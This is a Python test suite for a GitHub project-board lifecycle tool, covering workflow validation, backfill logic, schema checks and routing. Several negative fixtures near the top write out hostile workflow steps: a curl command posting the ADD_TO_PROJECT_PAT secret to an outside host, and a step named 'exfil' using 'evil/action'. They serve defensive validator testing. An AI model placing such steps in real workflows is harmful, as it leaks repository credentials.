
    def test_comments_do_not_count_as_workflow(self) -> None:
        ctx = self._write("# uses: actions/add-to-project@" + "a" * 40 + "\n")
        self.assertEqual(lb._auto_add_candidates(ctx), [])

    def test_rejects_split_duplicate_or_scripted_credential_use(self) -> None:
        url = "https://github.com/orgs/acme/projects/5"
        sha = "a" * 40
        cases = {
            "split_steps": (
                f"on:\n  issues:\n    types: [opened]\njobs:\n  add:\n    steps:\n"
                f"      - uses: actions/add-to-project@{sha}\n"
                f"      - name: misplaced inputs\n        with:\n          project-url: {url}\n"
                "          github-token: ${{ secrets.ADD_TO_PROJECT_PAT }}\n"),
            "wrong_input_parent": (
                f"on:\n  issues:\n    types: [opened]\njobs:\n  add:\n    steps:\n"
                f"      - uses: actions/add-to-project@{sha}\n        env:\n"
                f"          project-url: {url}\n"
                "          github-token: ${{ secrets.ADD_TO_PROJECT_PAT }}\n"),
            "duplicate_action": (
                f"on:\n  issues:\n    types: [opened]\njobs:\n  add:\n    steps:\n"
                f"      - uses: actions/add-to-project@{sha}\n        with:\n"
                f"          project-url: {url}\n"
                "          github-token: ${{ secrets.ADD_TO_PROJECT_PAT }}\n"
                f"      - uses: actions/add-to-project@{sha}\n"),
            "extra_secret_run": (
                f"on:\n  issues:\n    types: [opened]\njobs:\n  add:\n    steps:\n"
                f"      - uses: actions/add-to-project@{sha}\n        with:\n"
                f"          project-url: {url}\n"
                "          github-token: ${{ secrets.ADD_TO_PROJECT_PAT }}\n"
                "      - run: curl -d '${{ secrets.ADD_TO_PROJECT_PAT }}' example.invalid\n"),
            # Same step-budget bypasses as the App shape — one shared guard.
            "extra_name_first_action": (
                f"on:\n  issues:\n    types: [opened]\njobs:\n  add:\n    steps:\n"
                f"      - uses: actions/add-to-project@{sha}\n        with:\n"
                f"          project-url: {url}\n"
                "          github-token: ${{ secrets.ADD_TO_PROJECT_PAT }}\n"
                "      - name: exfil\n        uses: evil/action@v1\n"),
            "extra_flow_style_action": (
                f"on:\n  issues:\n    types: [opened]\njobs:\n  add:\n    steps:\n"
                f"      - uses: actions/add-to-project@{sha}\n        with:\n"
                f"          project-url: {url}\n"
                "          github-token: ${{ secrets.ADD_TO_PROJECT_PAT }}\n"
                "      - {uses: evil/action@v1}\n"),
            "extra_other_action": (
                f"on:\n  issues:\n    types: [opened]\njobs:\n  add:\n    steps:\n"
                f"      - uses: evil/action@{'b' * 40}\n"
                f"      - uses: actions/add-to-project@{sha}\n        with:\n"
                f"          project-url: {url}\n"
                "          github-token: ${{ secrets.ADD_TO_PROJECT_PAT }}\n"),
            "extra_trigger": (
                f"on:\n  issues:\n    types: [opened]\n  push:\n    branches: [main]\n"
                f"jobs:\n  add:\n    steps:\n      - uses: actions/add-to-project@{sha}\n"
                f"        with:\n          project-url: {url}\n"
                "          github-token: ${{ secrets.ADD_TO_PROJECT_PAT }}\n"),
            "duplicate_issue_trigger": (
                f"on:\n  issues:\n    types: [opened]\n  issues:\n    types: [opened]\n"
                f"jobs:\n  add:\n    steps:\n      - uses: actions/add-to-project@{sha}\n"
                f"        with:\n          project-url: {url}\n"
                "          github-token: ${{ secrets.ADD_TO_PROJECT_PAT }}\n"),
        }
        for name, text in cases.items():
            with self.subTest(case=name):
                inspection = lb.inspect_auto_add_workflow(self._write(text), url)
                self.assertFalse(inspection.valid, inspection.detail)


class ForwardBindingCheckTest(unittest.TestCase):
    """The pure per-branch doctor verdict (evaluate_forward_binding_check)."""

    def _binding(self, forward=None, raw="", through=None):
        return lb.BindingConfig(forward_binding=forward, forward_raw=raw,
                                backfilled_through=through, source="committed")

    @staticmethod
    def _inspection(path=None, valid=False, detail="missing", fix="fix it"):
        return lb.AutoAddWorkflowInspection(path, valid, detail, fix)

    def test_unset_warns(self) -> None:
        status, _detail, fix = lb.evaluate_forward_binding_check(
            self._binding(), self._inspection())
        self.assertEqual(status, "FAIL")
        self.assertIn(lb.CONFIG_KEY_FORWARD_BINDING, fix)

    def test_unrecognized_value_warns(self) -> None:
        status, detail, _fix = lb.evaluate_forward_binding_check(
            self._binding(forward=None, raw="bogus"), self._inspection())
        self.assertEqual(status, "FAIL")
        self.assertIn("bogus", detail)

    def test_workflow_only_passes_without_orphan(self) -> None:
        status, _d, _f = lb.evaluate_forward_binding_check(
            self._binding(forward="workflow-only"), self._inspection())
        self.assertEqual(status, "PASS")

    def test_workflow_only_fails_on_orphaned_auto_add_file(self) -> None:
        status, detail, _f = lb.evaluate_forward_binding_check(
            self._binding(forward="workflow-only"),
            self._inspection(".github/workflows/add-to-project.yml"))
        self.assertEqual(status, "FAIL")
        self.assertIn("add-to-project.yml", detail)

    def test_auto_add_fails_when_file_missing(self) -> None:
        status, _d, fix = lb.evaluate_forward_binding_check(
            self._binding(forward="auto-add"), self._inspection())
        self.assertEqual(status, "FAIL")
        self.assertIn("workflow-only", fix)

    def test_auto_add_passes_with_file_and_flags_secret_unverifiable(self) -> None:
        status, detail, _f = lb.evaluate_forward_binding_check(
            self._binding(forward="auto-add"),
            self._inspection(".github/workflows/add-to-project.yml", True, "validated", ""))
        self.assertEqual(status, "PASS")
        self.assertIn("secret", detail.lower())  # the write-only-secret caveat is explicit

    def test_none_passes(self) -> None:
        status, _d, _f = lb.evaluate_forward_binding_check(
            self._binding(forward="none"), self._inspection())
        self.assertEqual(status, "PASS")


class DoctorVerdictTest(unittest.TestCase):
    """Exercise the final verb_doctor verdict, not only individual helpers."""

    def setUp(self) -> None:
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.ctx = lb.RepoContext(root=self.tmp.name, main_root=self.tmp.name,
                                  origin_owner="acme", origin_repo="widget",
                                  default_branch="main")
        self.board = lb.BoardConfig("acme", 5, "committed")
        self.schema = lb.BoardSchema("PVT_1", "F_STATUS",
                                     {stage: f"O_{stage}" for stage in lb.STAGES}, "F_PRIORITY")

    @staticmethod
    def _runner(*, auth="github.com scopes: repo, project", issues=_ok("true\n")):
        def run(args, timeout=None):
            if args == ["auth", "status"]:
                return _ok(auth)
            if args[:2] == ["api", "repos/acme/widget"]:
                return issues
            if args[:2] == ["pr", "list"]:
                return _ok("[]")
            raise AssertionError(f"unexpected gh call: {args}")
        return run

    def _doctor(self, *, board=None, access=None, workflows=None, schema=..., linked=...,
                auth="github.com scopes: repo, project", issues=_ok("true\n")):
        board = self.board if board is ... else board
        access = lb.ProjectAccess("Organization", "PVT_1", True) if access is ... else access
        workflows = {"Item closed": True} if workflows is ... else workflows
        schema = self.schema if schema is ... else schema
        linked = [self.ctx.slug] if linked is ... else linked
        with mock.patch.object(lb.shutil, "which", return_value="/usr/bin/gh"), \
             mock.patch.object(lb, "_gh_version", return_value=(2, 94, 0)), \
             mock.patch.object(lb, "read_board_config", return_value=board), \
             mock.patch.object(lb, "project_access", return_value=access), \
             mock.patch.object(lb, "resolve_schema", return_value=schema), \
             mock.patch.object(lb, "project_workflows", return_value=workflows), \
             mock.patch.object(lb, "project_linked_repos", return_value=linked), \
             mock.patch.object(lb, "read_binding_config", return_value=lb.BindingConfig(
                 "workflow-only", "workflow-only", None, "committed")), \
             mock.patch.object(lb, "inspect_auto_add_workflow", return_value=
                               lb.AutoAddWorkflowInspection(None, False, "missing", "fix")):
            return lb.verb_doctor(self.ctx, self._runner(auth=auth, issues=issues))

    def test_ready_for_personal_and_organization_project_shapes(self) -> None:
        for owner_type in ("User", "Organization"):
            with self.subTest(owner_type=owner_type):
                result = self._doctor(board=..., access=lb.ProjectAccess(
                    owner_type, "PVT_1", True), workflows=...)
                self.assertTrue(result["ready"])

    def test_critical_unknown_or_missing_cases_fail_final_verdict(self) -> None:
        fail = subprocess.CompletedProcess(args=[], returncode=1, stdout="", stderr="denied")
        cases = {
            "board_missing": {"board": None, "access": None, "workflows": None},
            "project_scope_missing": {"board": ..., "access": ..., "workflows": ...,
                                      "auth": "github.com scopes: repo, read:project"},
            "issues_unreadable": {"board": ..., "access": ..., "workflows": ...,
                                  "issues": fail},
            "write_access_unknown": {"board": ..., "access": None, "workflows": ...},
            "write_access_denied": {"board": ..., "access": lb.ProjectAccess(
                "Organization", "PVT_1", False), "workflows": ...},
            "closed_workflow_unknown": {"board": ..., "access": ..., "workflows": None},
            "closed_workflow_disabled": {"board": ..., "access": ...,
                                         "workflows": {"Item closed": False}},
            "priority_missing": {"board": ..., "access": ..., "workflows": ...,
                                 "schema": lb.BoardSchema("PVT_1", "F_STATUS", {
                                     stage: f"O_{stage}" for stage in lb.STAGES}, None)},
            "repo_link_unknown": {"board": ..., "access": ..., "workflows": ...,
                                  "linked": None},
            "repo_not_linked": {"board": ..., "access": ..., "workflows": ...,
                                "linked": []},
        }
        for name, kwargs in cases.items():
            with self.subTest(case=name):
                self.assertFalse(self._doctor(**kwargs)["ready"])


class BackfillVerbTest(unittest.TestCase):
    """verb_backfill: idempotent add of open issues not on the board, with a
    contiguous, resumable high-water mark. The 50-cap bug guard lives here."""

    def setUp(self) -> None:
        import tempfile
        self._tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        root = self._tmp.name
        (Path(root) / lb.COMMITTED_CONFIG).write_text(
            "---\ngithub_project_owner: acme\ngithub_project_number: 1\n---\n",
            encoding="utf-8")
        self.ctx = lb.RepoContext(root=root, main_root=root, origin_owner="acme",
                                  origin_repo="widget", default_branch="main")

    def _marker(self):
        return lb.read_binding_config(self.ctx).backfilled_through

    def test_adds_missing_skips_present_and_records_marker(self) -> None:
        board_items = {"items": [_issue_item(1), _issue_item(2)]}
        repo_issues = [{"number": n, "url": f"https://github.com/acme/widget/issues/{n}"}
                       for n in (1, 2, 3, 4)]
        runner = FakeRunner([
            (["project", "item-list", "1", "--owner", "acme"], _ok(json.dumps(board_items))),
            (["issue", "list", "--repo", "acme/widget"], _ok(json.dumps(repo_issues))),
            (["api", "graphql"], _ok(_parents_batch([3, 4]))),
            (["project", "item-add", "1", "--owner", "acme"], _ok(json.dumps({"id": "i3"}))),
            (["project", "item-add", "1", "--owner", "acme"], _ok(json.dumps({"id": "i4"}))),
        ])
        result = lb.verb_backfill(self.ctx, runner)
        self.assertEqual(result["added"], [3, 4])
        self.assertEqual(sorted(result["already_present"]), [1, 2])
        self.assertEqual(result["counts"], {"added": 2, "already_present": 2,
                                            "skipped_sub_issues": 0, "failed": 0})
        self.assertEqual(result["high_water"], 4)
        self.assertTrue(result["marker_written"])
        self.assertEqual(self._marker(), 4)  # round-trips through the reader

    def test_excludes_prs_and_foreign_items_from_membership(self) -> None:
        # A PR-typed and a foreign-repo board item must NOT count as present, so
        # the matching repo issue (if any) is still (re-)added harmlessly.
        board_items = {"items": [
            _issue_item(1),
            _issue_item(2, type_="PullRequest"),      # dropped
            _issue_item(3, repo="other/repo"),         # foreign, dropped
        ]}
        repo_issues = [{"number": 1, "url": "u1"}, {"number": 5, "url": "u5"}]
        runner = FakeRunner([
            (["project", "item-list", "1", "--owner", "acme"], _ok(json.dumps(board_items))),
            (["issue", "list", "--repo", "acme/widget"], _ok(json.dumps(repo_issues))),
            (["api", "graphql"], _ok(_parents_batch([5]))),
            (["project", "item-add", "1", "--owner", "acme"], _ok(json.dumps({"id": "i5"}))),
        ])
        result = lb.verb_backfill(self.ctx, runner)
        self.assertEqual(result["already_present"], [1])
        self.assertEqual(result["added"], [5])

    def test_enumerates_past_fifty_no_silent_cap(self) -> None:
        # The latent bug this whole change guards against: a backfill built on
        # _item_list (cap 50) would silently drop issues 51+. 55 open issues,
        # empty board → all 55 added.
        n = 55
        repo_issues = [{"number": i, "url": f"u{i}"} for i in range(1, n + 1)]
        responses = [
            (["project", "item-list", "1", "--owner", "acme"], _ok(json.dumps({"items": []}))),
            (["issue", "list", "--repo", "acme/widget"], _ok(json.dumps(repo_issues))),
            (["api", "graphql"], _ok(_parents_batch(list(range(1, n + 1))))),
        ]
        responses += [(["project", "item-add", "1", "--owner", "acme"],
                       _ok(json.dumps({"id": f"i{i}"}))) for i in range(1, n + 1)]
        runner = FakeRunner(responses)
        result = lb.verb_backfill(self.ctx, runner)
        self.assertEqual(result["counts"]["added"], n)
        self.assertEqual(result["high_water"], n)
        # And the enumeration used a >50 limit, not READY_WORK_LIMIT.
        list_call = next(c for c in runner.calls if c[:1] == ["issue"])
        self.assertIn(str(lb.BACKFILL_ISSUE_LIMIT), list_call)
        self.assertNotIn(str(lb.READY_WORK_LIMIT), list_call)

    def test_partial_failure_keeps_high_water_contiguous(self) -> None:
        # Issue 3's add fails; the mark advances only over the contiguous 1..2
        # prefix so "everything <= mark is present" holds and a re-run resumes.
        repo_issues = [{"number": i, "url": f"u{i}"} for i in (1, 2, 3, 4, 5)]
        runner = FakeRunner([
            (["project", "item-list", "1", "--owner", "acme"], _ok(json.dumps({"items": []}))),
            (["issue", "list", "--repo", "acme/widget"], _ok(json.dumps(repo_issues))),
            (["api", "graphql"], _ok(_parents_batch([1, 2, 3, 4, 5]))),
            (["project", "item-add", "1", "--owner", "acme"], _ok(json.dumps({"id": "i1"}))),
            (["project", "item-add", "1", "--owner", "acme"], _ok(json.dumps({"id": "i2"}))),
            (["project", "item-add", "1", "--owner", "acme"],
             subprocess.CompletedProcess([], 1, "", "boom")),
            (["project", "item-add", "1", "--owner", "acme"], _ok(json.dumps({"id": "i4"}))),
            (["project", "item-add", "1", "--owner", "acme"], _ok(json.dumps({"id": "i5"}))),
        ])
        result = lb.verb_backfill(self.ctx, runner)
        self.assertEqual(sorted(result["added"]), [1, 2, 4, 5])
        self.assertEqual([f["issue"] for f in result["failed"]], [3])
        self.assertEqual(result["high_water"], 2)   # contiguous prefix only
        self.assertEqual(self._marker(), 2)

    def test_marker_not_regressed_when_all_present(self) -> None:
        # Second run over a fully-backfilled board: no adds, marker stays put.
        (Path(self.ctx.main_root) / lb.COMMITTED_CONFIG).write_text(
            "---\ngithub_project_owner: acme\ngithub_project_number: 1\n"
            "github_project_backfilled_through: 2\n---\n", encoding="utf-8")
        board_items = {"items": [_issue_item(1), _issue_item(2)]}
        repo_issues = [{"number": 1, "url": "u1"}, {"number": 2, "url": "u2"}]
        runner = FakeRunner([
            (["project", "item-list", "1", "--owner", "acme"], _ok(json.dumps(board_items))),
            (["issue", "list", "--repo", "acme/widget"], _ok(json.dumps(repo_issues))),
        ])
        result = lb.verb_backfill(self.ctx, runner)
        self.assertEqual(result["added"], [])
        self.assertFalse(result["marker_written"])  # 2 is not > prior 2
        self.assertEqual(self._marker(), 2)

    def test_sub_issue_skipped_parentless_added(self) -> None:
        # Sub-issues carry no lifecycle stage; only parents belong on the board
        # (issue #269). Issue 2 is a sub-issue of #99 → skipped, not added; the
        # parentless 1 and 3 are added. A skip is a permanent decision, so — like
        # an already-present issue — it advances the contiguous high-water mark.
        repo_issues = [{"number": n, "url": f"u{n}"} for n in (1, 2, 3)]
        runner = FakeRunner([
            (["project", "item-list", "1", "--owner", "acme"], _ok(json.dumps({"items": []}))),
            (["issue", "list", "--repo", "acme/widget"], _ok(json.dumps(repo_issues))),
            (["api", "graphql"], _ok(_parents_batch([1, 2, 3], parents={2: 99}))),
            (["project", "item-add", "1", "--owner", "acme"], _ok(json.dumps({"id": "i1"}))),
            (["project", "item-add", "1", "--owner", "acme"], _ok(json.dumps({"id": "i3"}))),
        ])
        result = lb.verb_backfill(self.ctx, runner)
        self.assertEqual(result["added"], [1, 3])
        self.assertEqual(result["skipped_sub_issues"], [2])
        self.assertEqual(result["failed"], [])
        self.assertEqual(result["counts"],
                         {"added": 2, "already_present": 0,
                          "skipped_sub_issues": 1, "failed": 0})
        self.assertEqual(result["high_water"], 3)   # skip does not stall the mark
        self.assertTrue(result["marker_written"])
        self.assertEqual(self._marker(), 3)
        # The sub-issue never reached item-add (only the two parentless adds ran).
        self.assertEqual(sum(1 for c in runner.calls if c[:2] == ["project", "item-add"]), 2)

    def test_parent_lookup_failure_fails_toward_not_adding(self) -> None:
        # A single unreadable parent node must fail THAT candidate toward not
        # adding it (never risk sweeping a sub-issue on) and break the prefix so a
        # re-run reconsiders it — the rest of the loop still proceeds.
        repo_issues = [{"number": n, "url": f"u{n}"} for n in (1, 2, 3)]
        runner = FakeRunner([
            (["project", "item-list", "1", "--owner", "acme"], _ok(json.dumps({"items": []}))),
            (["issue", "list", "--repo", "acme/widget"], _ok(json.dumps(repo_issues))),
            (["api", "graphql"], _ok(_parents_batch([1, 2, 3], null_for={2}))),
            (["project", "item-add", "1", "--owner", "acme"], _ok(json.dumps({"id": "i1"}))),
            (["project", "item-add", "1", "--owner", "acme"], _ok(json.dumps({"id": "i3"}))),
        ])
        result = lb.verb_backfill(self.ctx, runner)
        self.assertEqual(sorted(result["added"]), [1, 3])
        self.assertEqual([f["issue"] for f in result["failed"]], [2])
        self.assertEqual(result["skipped_sub_issues"], [])
        self.assertEqual(result["high_water"], 1)   # contiguous prefix stops at 2
        self.assertEqual(self._marker(), 1)

    def test_skip_does_not_advance_mark_past_an_earlier_failure(self) -> None:
        # Candidate 1's parent lookup fails (breaks the contiguous prefix), then
        # candidate 2 is a legitimate sub-issue skip. The skip branch's advance is
        # guarded by `if contiguous:` — a broken prefix must keep the mark at 0 so
        # a re-run reconsiders 1 and the skip never masquerades as coverage.
        repo_issues = [{"number": n, "url": f"u{n}"} for n in (1, 2)]
        runner = FakeRunner([
            (["project", "item-list", "1", "--owner", "acme"], _ok(json.dumps({"items": []}))),
            (["issue", "list", "--repo", "acme/widget"], _ok(json.dumps(repo_issues))),
            (["api", "graphql"], _ok(_parents_batch([1, 2], parents={2: 99}, null_for={1}))),
        ])
        result = lb.verb_backfill(self.ctx, runner)
        self.assertEqual(result["added"], [])
        self.assertEqual([f["issue"] for f in result["failed"]], [1])
        self.assertEqual(result["skipped_sub_issues"], [2])
        self.assertEqual(result["high_water"], 0)          # skip stays behind the failure
        self.assertFalse(result["marker_written"])
        self.assertIsNone(self._marker())
        # No add was attempted at all.
        self.assertFalse(any(c[:2] == ["project", "item-add"] for c in runner.calls))

    def test_total_parent_lookup_failure_adds_nothing_without_aborting(self) -> None:
        # A whole-query parent-lookup failure fails EVERY candidate toward not
        # adding — the loop must not abort and must add nothing.
        repo_issues = [{"number": n, "url": f"u{n}"} for n in (1, 2)]
        runner = FakeRunner([
            (["project", "item-list", "1", "--owner", "acme"], _ok(json.dumps({"items": []}))),
            (["issue", "list", "--repo", "acme/widget"], _ok(json.dumps(repo_issues))),
            (["api", "graphql"], subprocess.CompletedProcess([], 1, "", "boom")),
        ])
        result = lb.verb_backfill(self.ctx, runner)
        self.assertEqual(result["added"], [])
        self.assertEqual([f["issue"] for f in result["failed"]], [1, 2])
        self.assertEqual(result["high_water"], 0)
        # No add was attempted (loop failed toward not-adding, did not abort).
        self.assertFalse(any(c[:2] == ["project", "item-add"] for c in runner.calls))

    def test_malformed_parent_lookup_body_degrades_like_total_failure(self) -> None:
        # rc==0 but non-JSON stdout must degrade exactly like an rc!=0 failure:
        # every candidate drops out of the parent map and is failed toward
        # not-adding — never a JSONDecodeError up the stack (the docstring's
        # "a total failure does NOT raise" promise).
        repo_issues = [{"number": n, "url": f"u{n}"} for n in (1, 2)]
        runner = FakeRunner([
            (["project", "item-list", "1", "--owner", "acme"], _ok(json.dumps({"items": []}))),
            (["issue", "list", "--repo", "acme/widget"], _ok(json.dumps(repo_issues))),
            (["api", "graphql"], _ok("<html>rate limited</html>")),  # rc 0, not JSON
        ])
        result = lb.verb_backfill(self.ctx, runner)  # must not raise
        self.assertEqual(result["added"], [])
        self.assertEqual([f["issue"] for f in result["failed"]], [1, 2])
        self.assertEqual(result["high_water"], 0)
        self.assertFalse(any(c[:2] == ["project", "item-add"] for c in runner.calls))


class SchemaOptionMissingTest(unittest.TestCase):
    """The forcing function. Adding a stage deliberately hard-errors every board
    that predates it, so an upgraded plugin can never operate on a board that
    cannot represent the new stage. This must fail LOUDLY and name the fix —
    it is the one behavior a consumer meets on upgrade day."""

    def setUp(self) -> None:
        self.board = lb.BoardConfig(owner="acme", number=1, source="committed")
        self.ctx = lb.RepoContext(root=".", main_root=".", origin_owner="acme",
                                  origin_repo="widget", default_branch="main")

    def _runner(self, stages, priority_options=None):
        fields = [{"name": "Status", "id": "F", "projectId": "P",
                   "options": [{"id": f"o_{s}", "name": s} for s in stages]}]
        if priority_options is not False:
            opts = (priority_options if priority_options is not None
                    else list(lb.PRIORITY_VALUES))
            fields.append({"name": "Priority", "id": "F_PRI", "projectId": "P",
                           "options": [{"id": f"o_{p}", "name": p} for p in opts]})
        return FakeRunner([
            (["project", "field-list", "1", "--owner", "acme"],
             _ok(json.dumps({"fields": fields}))),
        ])

    def test_board_missing_any_stage_raises_option_missing(self) -> None:
        for absent in lb.STAGES:
            with self.subTest(absent=absent):
                runner = self._runner([s for s in lb.STAGES if s != absent])
                with self.assertRaises(lb.BoardError) as caught:
                    lb.resolve_schema(self.board, self.ctx, runner, {})
                self.assertEqual(caught.exception.code, "option_missing")
                self.assertIn(absent, str(caught.exception))

    def test_the_fix_names_the_bootstrap_script(self) -> None:
        """An operator meeting this error needs a runnable command, not a
        diagnosis. Asserted by the script name, not the sentence around it."""
        runner = self._runner([s for s in lb.STAGES if s != "ready_for_work"])
        with self.assertRaises(lb.BoardError) as caught:
            lb.resolve_schema(self.board, self.ctx, runner, {})
        self.assertIn("bootstrap_lifecycle_board.py", caught.exception.fix)

    def test_a_current_board_resolves(self) -> None:
        schema = lb.resolve_schema(self.board, self.ctx, self._runner(lb.STAGES), {})
        self.assertEqual(set(schema.status_options), set(lb.STAGES))
        self.assertEqual(set(schema.priority_options), set(lb.PRIORITY_VALUES))
        self.assertEqual(schema.priority_field_id, "F_PRI")

    def test_board_missing_priority_field_raises_option_missing(self) -> None:
        runner = self._runner(lb.STAGES, priority_options=False)
        with self.assertRaises(lb.BoardError) as caught:
            lb.resolve_schema(self.board, self.ctx, runner, {})
        self.assertEqual(caught.exception.code, "option_missing")
        self.assertIn("Priority", str(caught.exception))

    def test_board_missing_priority_option_raises_option_missing(self) -> None:
        runner = self._runner(lb.STAGES, priority_options=["p1", "p2"])  # no p3
        with self.assertRaises(lb.BoardError) as caught:
            lb.resolve_schema(self.board, self.ctx, runner, {})
        self.assertEqual(caught.exception.code, "option_missing")
        self.assertIn("p3", str(caught.exception))


class FixtureReplayTest(unittest.TestCase):
    """Recorded gh fixtures are load-bearing: each is replayed through its real
    engine consumer so a shape drift in a re-record breaks a test, not prod."""

    FIXTURES = Path(__file__).resolve().parent / "fixtures" / "gh"

    def _load(self, name: str):
        return json.loads((self.FIXTURES / name).read_text(encoding="utf-8"))

    def test_project_field_list_resolves_every_stage(self) -> None:
        # NOTE: the recording predates `ready_for_work`; that one Status option
        # was hand-added in the same option shape. This test pins the SHAPE the
        # parser accepts, not live board contents — option ids are opaque
        # strings to the engine, so a synthetic id proves exactly what a real
        # one would. A re-record is not blocked (the configured board is already
        # on all eight options) but would rebase every unrelated field id in the
        # fixture, which this test does not need. The un-migrated board is
        # covered separately, by SchemaOptionMissingTest below.
        payload = self._load("project_field_list.json")
        status, priority = lb.parse_field_list(payload)
        self.assertIsNotNone(status)
        options = {o["name"]: o["id"] for o in status.get("options", [])}
        for stage in lb.STAGES:
            self.assertIn(stage, options, f"{stage} not resolvable from recorded field-list")
        self.assertIsNotNone(priority)  # Priority field is present in the recording

    def test_issue_list_deps_blocked_by_has_bounded_node_states(self) -> None:
        # Lifecycle reads blocker node states, never totalCount: this pins the
        # fixture shape a re-record must preserve.
        items = self._load("issue_list_deps.json")
        self.assertIsInstance(items, list)
        for item in items:
            self.assertIsInstance(item["blockedBy"], dict)
            self.assertIsInstance(item["blockedBy"].get("nodes"), list)
            for node in item["blockedBy"]["nodes"]:
                self.assertIn(node.get("state"), {"OPEN", "CLOSED"})

    def test_issue_view_closed_has_keys_engine_switches_on(self) -> None:
        data = self._load("issue_view_closed.json")
        self.assertEqual(data["state"], "CLOSED")
        self.assertEqual(data["stateReason"], "COMPLETED")
        self.assertIn("closedByPullRequestsReferences", data)
        self.assertIsInstance(data["closedByPullRequestsReferences"], list)

    def test_pr_view_merged_shape(self) -> None:
        data = self._load("pr_view_merged.json")
        self.assertEqual(data["state"], "MERGED")
        self.assertIsNotNone(data["mergedAt"])

    def test_project_item_list_issue_numbers_parse_from_recorded_shape(self) -> None:
        # Load-bearing: the recorded item-list is fed through _origin_issue_number
        # (the exact consumer verb_backfill's _board_issue_numbers uses). A future
        # re-record where content.repository stops being a plain string, or type
        # is renamed, breaks THIS test — not a live backfill. The fixture must be
        # non-empty for this to pin anything.
        payload = self._load("project_item_list.json")
        items = payload["items"]
        self.assertGreater(len(items), 0, "fixture must be non-empty to pin the shape")
        numbers = [lb._origin_issue_number(i, "aagnone3/agentic-engineering") for i in items]
        self.assertTrue(all(isinstance(n, int) for n in numbers),
                        "every recorded Issue item must resolve to an int number")
        # content.repository is a plain string in item-list output (not {nameWithOwner}).
        self.assertIsInstance(items[0]["content"]["repository"], str)


class GroomRouteTest(unittest.TestCase):
    """The groom Routing Ladder as data — one row per current stage, each a
    whole run path ending at STOP. Only `intake` leaves a decision to the model."""

    def _route(self, **kw):
        base = dict(has_issue=True, stage=None, plan_doc=None, brainstorm_doc=None,
                    provenance="trusted", stale_issue=False)
        base.update(kw)
        return lb.route_for_groom(**base)

    def test_no_issue_or_stub_is_intake(self) -> None:
        self.assertEqual(self._route(has_issue=False).route, "intake")
        self.assertEqual(self._route(stage="stub").route, "intake")
        # intake hands exactly one decision back to the model.
        self.assertIsNotNone(self._route(stage="stub").next)

    def test_brainstormed_plans_directly(self) -> None:
        self.assertEqual(self._route(stage="brainstormed", brainstorm_doc="b.md").route, "plan")
        # even without the doc present it routes to plan (plan repairs it)
        self.assertEqual(self._route(stage="brainstormed").route, "plan")

    def test_planned_with_doc_is_already_planned(self) -> None:
        self.assertEqual(self._route(stage="planned", plan_doc="p.md").route, "already_planned")

    def test_planned_without_doc_is_already_planned(self) -> None:
        self.assertEqual(self._route(stage="planned", plan_doc=None).route, "already_planned")

    def test_in_flight_stages_are_past(self) -> None:
        self.assertEqual(self._route(stage="in_progress").route, "past")
        self.assertEqual(self._route(stage="in_review").route, "past")

    def test_ready_for_work_is_past_grooming_never_intake(self) -> None:
        # An approved item falling through to `intake` would re-groom work a
        # human already signed off on.
        r = self._route(stage="ready_for_work")
        self.assertEqual(r.route, "past")
        self.assertNotEqual(r.route, "intake")

    def test_every_stage_has_a_declared_route(self) -> None:
        # One row per stage — a newly added stage must not silently land in the
        # unrecognized-stage `intake` catch-all.
        expected = {
            "stub": "intake",
            "brainstormed": "plan",
            "planned": "already_planned",
            "ready_for_work": "past",
            "in_progress": "past",
            "in_review": "past",
            "done": "terminal",
            "abandoned": "abandoned",
        }
        self.assertEqual(set(expected), set(lb.STAGES))
        for stage, route in expected.items():
            with self.subTest(stage=stage):
                self.assertEqual(self._route(stage=stage).route, route)
                self.assertIn(route, lb.GROOM_ROUTES)

    def test_terminal_and_abandoned(self) -> None:
        self.assertEqual(self._route(stage="done").route, "terminal")
        self.assertEqual(self._route(stage="abandoned").route, "abandoned")

    def test_untrusted_provenance_blocks_before_any_stage_routing(self) -> None:
        r = self._route(stage="planned", plan_doc="p.md", provenance="untrusted")
        self.assertEqual(r.route, "blocked")
        self.assertEqual(r.blocker, "untrusted_provenance")

    def test_missing_issue_blocks(self) -> None:
        r = self._route(stage=None, stale_issue=True)
        self.assertEqual(r.route, "blocked")
        self.assertEqual(r.blocker, "issue_not_found")


class ParseCreatedIssueNumberTest(unittest.TestCase):
    def test_parses_trailing_number_from_create_url(self) -> None:
        self.assertEqual(lb.parse_created_issue_number("https://github.com/o/r/issues/183\n"), 183)

    def test_ignores_noise_and_trailing_slash_takes_last_url(self) -> None:
        out = "Creating issue\nhttps://github.com/o/r/issues/9/\n"
        self.assertEqual(lb.parse_created_issue_number(out), 9)

    def test_no_url_raises_rather_than_guessing(self) -> None:
        with self.assertRaises(lb.BoardError) as cm:
            lb.parse_created_issue_number("some unrelated output")
        self.assertEqual(cm.exception.code, "issue_create_parse_failed")


class DecomposeSpecValidationTest(unittest.TestCase):
    def test_valid_spec_returns_ordered_subs(self) -> None:
        spec = {"plan_path": "docs/plans/p.md", "priority": "p2", "milestone": None, "sub_issues": [
            {"title": "a", "body_file": "s1.md"},
            {"title": "b", "body_file": "s2.md", "blocked_by": [0]}]}
        subs = lb.validate_decompose_spec(spec, has_parent=True)
        self.assertEqual(len(subs), 2)

    def test_missing_plan_path_rejected(self) -> None:
        with self.assertRaises(lb.BoardError) as cm:
            lb.validate_decompose_spec({"priority": "p2", "milestone": None, "sub_issues": []}, has_parent=True)
        self.assertEqual(cm.exception.code, "invalid_decompose_spec")

    def test_required_priority_accepted(self) -> None:
        for value in lb.PRIORITY_VALUES:
            spec = {"plan_path": "p", "priority": value, "milestone": None, "sub_issues": []}
            self.assertEqual(lb.validate_decompose_spec(spec, has_parent=True), [])

    def test_omitted_or_invalid_priority_rejected(self) -> None:
        for bad in (
            {"plan_path": "p", "milestone": None, "sub_issues": []},
            {"plan_path": "p", "priority": None, "milestone": None, "sub_issues": []},
            {"plan_path": "p", "priority": "p0", "milestone": None, "sub_issues": []},
        ):
            with self.assertRaises(lb.BoardError) as cm:
                lb.validate_decompose_spec(bad, has_parent=True)
            self.assertEqual(cm.exception.code, "invalid_decompose_spec")
            self.assertIn("priority", str(cm.exception))

    def test_sub_level_priority_rejected_with_spec_level_hint(self) -> None:
        spec = {"plan_path": "p", "priority": "p2", "milestone": None, "sub_issues": [
            {"title": "a", "body_file": "s", "priority": "p1"}]}
        with self.assertRaises(lb.BoardError) as cm:
            lb.validate_decompose_spec(spec, has_parent=True)
        self.assertEqual(cm.exception.code, "invalid_decompose_spec")
        self.assertIn("spec.priority", str(cm.exception))

